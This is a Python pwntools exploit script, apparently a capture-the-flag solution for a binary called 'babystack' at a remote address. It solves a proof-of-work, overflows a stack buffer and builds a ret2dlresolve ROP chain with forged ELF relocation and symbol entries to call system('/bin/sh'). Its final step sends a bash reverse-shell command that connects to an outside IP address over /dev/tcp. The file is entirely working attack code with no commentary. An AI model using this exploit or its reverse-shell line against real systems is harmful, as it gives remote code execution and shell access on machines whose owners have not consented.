#!/usr/bin/env python

from pwn import *
from hashlib import sha256
import time

# r = process('./babystack')
r = remote('202.120.7.202', 6666)

def verify():
    data = r.recvline()[:-1]
    for i in xrange(2 ** 32):
        if sha256(data + p32(i)).digest().startswith('\0\0\0'):
            break
    r.send(p32(i))
    log.info('POW is over')
    sleep(0.5)

def send(data, length):
    time.sleep(0.1)
    r.send(data.ljust(length))

plt0 = 0x80482f0
relplt = 0x80482b0
dynsym = 0x80481cc
dynstr = 0x804822c

main = 0x8048457
read_plt = 0x8048300

buf = 0x804a500

rop = flat(
        # _dl_runtime_resolve call and reloc_arg
        plt0, buf - relplt, # will resolve system
        0xdeadbeef, # return address
        buf + 36 # parameter "/bin/sh"
        )

data = flat(
        # Elf32_Rel
        buf, 0x7 | ((buf + 12 - dynsym) / 16) << 8, 0xdeadbeef, # 0xdeadbeef is padding
        # Elf32_Sym
        buf + 28 - dynstr, 0, 0, 0x12,
        'system\x00\x00',
        '/bin/sh\x00'
        )

verify()

# read data to buf
send('a' * 44 + flat(read_plt, main, 0, buf, 44), 0x40)
send(data, 44)

# use ret2dlresolve to call system("/bin/sh")
send('a' * 44 + rop, 0x40)

# make a reverse shell
send('bash -c "bash -i &>/dev/tcp/35.201.141.84/80 0>&1"', 0x100)

r.interactive()